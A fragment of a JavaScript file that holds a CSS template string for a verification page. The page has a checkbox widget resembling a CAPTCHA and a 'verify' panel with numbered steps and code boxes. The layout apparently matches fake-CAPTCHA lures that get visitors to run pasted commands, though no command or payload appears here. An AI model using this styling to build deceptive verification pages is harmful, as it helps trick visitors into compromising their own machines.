    initializeVerification();
});
`;




const CSS = `
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
  display: flex;
  flex-direction: column;
  height: 100vh;
  min-height: 100vh;
  background-color: #fcfcfc;
  color: #333;
}

.main-wrapper {
  align-items: center;
  display: flex;
  flex: 1;
  flex-direction: column;
}

.main-content {
  margin: 8rem auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%;
}

.logo-container {
  display: flex;
  align-items: center;
}

.logo-img {
  height: 2rem;
  margin-right: 0.5rem;
}

.domain-title {
  font-size: 2.5rem;
  font-weight: 500;
  line-height: 3.75rem;
}

.text-container {
  font-size: 1.5rem;
  line-height: 2.25rem;
  margin-bottom: 2rem;
  min-height: 2rem;
  font-weight: 550;
  padding-top: 2px;
}

.preloader {
  display: flex;
  align-items: center;
  justify-content: center;
}

.lds-ring {
  display: inline-block;
  position: relative;
  height: 1.875rem;
  width: 1.875rem;
}

.lds-ring div {
  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  border: 0.3rem solid transparent;
  border-radius: 50%;
  border-top-color: #313131;
  box-sizing: border-box;
  display: block;
  position: absolute;
  height: 1.875rem;
  width: 1.875rem;
}

.lds-ring div:first-child {
  animation-delay: -0.45s;
}

.lds-ring div:nth-child(2) {
  animation-delay: -0.3s;
}

.lds-ring div:nth-child(3) {
  animation-delay: -0.15s;
}

@keyframes lds-ring {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

@media (prefers-color-scheme: dark) {
  body .lds-ring div {
    border-color: #676767 transparent transparent;
  }
}

.checkbox-window {
  display: flex;
  flex-direction: column;
  align-items: center;
  width: 300px;
  height: 74px;
  background-color: #fafafa;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  padding: 10px;
  overflow: hidden;
  transition: width 0.5s ease-in-out, height 0.5s ease-in-out, opacity 0.3s;
  opacity: 0;
}

.checkbox-window-inner {
  display: flex;
  align-items: center;
  width: 100%;
}

.checkbox-container {
  width: 30px;
  height: 28px;
  margin-left: 3px;
  margin-right: 12px;
  position: relative;
}

#spinner2 {
  width: 40px;
  height: 40px;
  animation: rotate 4s linear infinite;
  margin-top: -4px;
  fill: green;
}

@keyframes rotate {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
}

.checkbox {
  width: 100%;
  height: 100%;
  background-color: #fff;
  border-radius: 2px;
  border: 2px solid #888;
  cursor: pointer;
  transition: border-color 0.3s, background-color 0.3s;
}

.checkbox.checked {
  border-color: #4285f4;
  background-color: #4285f4;
  position: relative;
}

.checkbox.checked::after {
  content: "\f00c";
  font-family: "FontAwesome";
  color: #fff;
  font-size: 18px;
  position: absolute;
  top: -2px;
  left: 2px;
}

.spinner {
  visibility: hidden;
  position: relative;
}

.tettx {
  color: rgb(78, 78, 78);
}

.tettx p {
  margin: 0 !important;
}

.legal-links {
  font-size: 8px;
  text-align: right;
  margin-left: auto;
}

.legal-links img {
  width: 67px;
  height: 23px;
  margin-bottom: 5px;
}

.legal-links p {
  text-decoration: underline;
}

.verify-window {
  font-family: Roboto, helvetica, arial, sans-serif;
  opacity: 0;
  visibility: hidden;
  width: 100%;
  height: 0;
  transition: opacity 0.5s, height 0.5s;
  border-top: 1px solid #797979;
  padding-top: 3px;
  margin-top: 15px;
}

.verify-window.active {
  opacity: 1;
  visibility: visible;
  height: auto;
  display: block;
}

.verify-header {
  background-color: #e85d1a;
  padding: 10px 16px;
  color: #fff;
  font-size: 14px;
  border-radius: 0;
}

.verify-main {
  padding: 16px;
  font-size: 14px;
  color: #333;
}

.verify-main p:first-of-type {
  font-size: 18px;
  margin-bottom: 15px;
}

.verify-main ol {
  padding-left: 20px;
}

.verify-main ol li {
  margin-bottom: 10px;
}

.verify-main code {
  display: block;
  margin-top: 10px;
  background-color: #f9f9f9;
  padding: 10px;
  font-size: 12px;
  border: 1px solid #ddd;
}

.verify-main .observe {
  padding-top: 10px;
}

.verify-main .observe code {
  background: none;
  border: 1px solid #797979;
  width: 432px;
  color: #d9d9d9;
}

.verify-footer {
  background-color: #f2f2f2;
  padding: 16px;
  text-align: right;
}

.verify-footer-container {
  background: none;
}

.verify-footer-left {
  width: 286px;
  float: left;
  text-align: left;
  font-size: 15px;
}

.verify-verify-button {
  background: #5e5e5e;
  padding: 9px 38px;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.verify-verify-button:hover {
  background: #4a4a4a;
}

.footer {
  font-size: 0.75rem;
  line-height: 1.125rem;
  margin: 0 auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%;
}

.footer-inner {
  border-top: 1px solid #d9d9d9;
  padding-bottom: 1rem;
  padding-top: 1rem;
  text-align: center;
}

.footer-inner > div:first-child {
  margin-bottom: 5px;
}

.footer-inner code {
  font-family: monospace;
}

.domain-footer {
  font-size: 1.5rem;
  line-height: 2.25rem;
  padding-top: 33px;
}

.step0,
.step1,
.step2,
.step3 {
  display: none;
}

.step0.active,
.step1.active,
.step2.active,
.step3.active {
  display: block;
}

.success-icon {
  width: 30px;
  height: 30px;
}

.success-icon circle {
  fill: #28a745;
}

.success-icon path {
  stroke: white;
  stroke-width: 4;
  fill: none;
  stroke-linecap: round;
  stroke-linejoin: round;
}
`;